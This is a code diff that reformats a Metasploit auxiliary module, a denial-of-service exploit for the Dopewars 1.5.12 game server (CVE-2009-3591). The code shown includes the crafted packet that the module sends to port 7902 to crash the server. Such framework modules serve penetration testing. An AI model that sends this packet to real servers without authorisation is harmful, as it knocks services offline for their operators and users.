@@ -8,21 +8,24 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'			 => 'Dopewars Denial of Service',
-      'Description'	 => %q{
+    super(
+      update_info(
+        info,
+        'Name'	=> 'Dopewars Denial of Service',
+        'Description'	=> %q{
           The jet command in Dopewars 1.5.12 is vulnerable to a segmentation fault due to
-        a lack of input validation.
-      },
-      'Author'		 => [ 'Doug Prostko <dougtko[at]gmail.com>' ],
-      'License'		 => MSF_LICENSE,
-      'References'	 =>
-        [
+          a lack of input validation.
+        },
+        'Author'	=> [ 'Doug Prostko <dougtko[at]gmail.com>' ],
+        'License'	=> MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2009-3591' ],
           [ 'OSVDB', '58884' ],
           [ 'BID', '36606' ]
         ],
-      'DisclosureDate' => '2009-10-05' ))
+        'DisclosureDate' => '2009-10-05'
+      )
+    )
 
     register_options([Opt::RPORT(7902)])
   end
@@ -36,7 +39,7 @@ class MetasploitModule < Msf::Auxiliary
     # 525			dopelog(4, LF_SERVER, "%s jets to %s",
     #
     connect
-    pkt =  "foo^^Ar1111111\n^^Acfoo\n^AV65536\n"
+    pkt = "foo^^Ar1111111\n^^Acfoo\n^AV65536\n"
     print_status("Sending dos packet...")
     sock.put(pkt)
     disconnect
